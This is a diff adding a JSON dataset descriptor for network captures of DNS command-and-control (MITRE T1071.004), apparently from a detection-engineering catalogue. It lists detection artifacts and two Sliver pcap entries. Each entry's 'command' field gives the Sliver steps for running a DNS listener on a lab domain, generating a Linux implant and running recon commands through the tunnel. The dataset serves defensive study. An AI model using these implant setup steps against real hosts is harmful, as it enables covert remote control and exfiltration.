@@ -1,0 +1,82 @@
+{
+  "mitre": {
+    "technique_id": "T1071.004",
+    "technique_name": "Application Layer Protocol: DNS",
+    "url": "https://attack.mitre.org/techniques/T1071/004/",
+    "tactics": ["TA0011"]
+  },
+  "description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection / network filtering by blending in with existing DNS traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed.",
+  "artifacts": [
+    "outbound DNS queries to a controlled C2 domain (non-corporate / non-resolver)",
+    "DNS queries with abnormally long subdomain labels (often 30-63 characters, base32 / hex-encoded payload)",
+    "TXT, A or CNAME query/response patterns inconsistent with normal browsing behavior",
+    "periodic beaconing pattern (regular interval DNS queries) characteristic of DNS beacon implants",
+    "long-lived DNS conversation between a single client and a single external/controlled DNS server (interactive session mode)",
+    "high entropy in DNS query labels typical of sliver DNS implants",
+    "DNS responses carrying tasked commands / chunks of command output back to the implant",
+    "Linux command output patterns (whoami, hostname, uname -a, id, ps aux) reassembled from DNS traffic in session mode"
+  ],
+  "datasets": {
+    "pcaps": [
+      {
+        "id": "t1071.004-internal-dns-c2-beacon-linux-sliver",
+        "file": "pcaps/techniques/t1071.004/t1071.004_internal_dns_c2_beacon_linux__sliver.pcap",
+        "name": "Internal DNS C2 beacon Linux - sliver",
+        "description": "Internal C2 traffic from a Linux sliver implant operating in beacon mode over DNS, showing periodic check-in queries to the controlled DNS C2 zone. Beacon mode is characterized by regular polling intervals rather than persistent connections.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "udp",
+          "ports": [53]
+        },
+        "filter": [
+          "internal",
+          "dns",
+          "c2",
+          "command-and-control",
+          "beacon",
+          "tunnel",
+          "linux",
+          "sliver",
+          "implant",
+          "udp",
+          "53",
+          "critical"
+        ],
+        "command": "# server: sliver-server then `dns --domains exfil.packetfeeder.lab`\n# implant: generate beacon --dns exfil.packetfeeder.lab. --os linux --arch amd64\n# target: ./sliver_implant"
+      },
+      {
+        "id": "t1071.004-internal-dns-c2-session-linux-sliver",
+        "file": "pcaps/techniques/t1071.004/t1071.004_internal_dns_c2_session_linux__sliver.pcap",
+        "name": "Internal DNS C2 interactive session Linux - sliver",
+        "description": "Internal C2 traffic from a Linux sliver implant operating in interactive session mode over DNS, showing sustained bidirectional command/response traffic for reconnaissance commands (whoami, hostname, uname -a, id, ps aux) executed from the sliver client and tunneled inside DNS query/response labels.",
+        "criticality": "critical",
+        "scope": {
+          "protocol": "udp",
+          "ports": [53]
+        },
+        "filter": [
+          "internal",
+          "dns",
+          "c2",
+          "command-and-control",
+          "session",
+          "interactive",
+          "tunnel",
+          "linux",
+          "sliver",
+          "implant",
+          "recon",
+          "udp",
+          "53",
+          "critical"
+        ],
+        "command": "# server: sliver-server then `dns --domains exfil.packetfeeder.lab`\n# implant: generate --dns exfil.packetfeeder.lab. --os linux --arch amd64\n# target: ./sliver_implant\n# operator (sliver client): use <session>; execute whoami; execute hostname; execute uname -a; execute id; execute ps aux"
+      }
+    ]
+  },
+  "metadata": {
+    "domain": "enterprise",
+    "confidence": "high",
+    "schema_version": "1.0"
+  }
+}
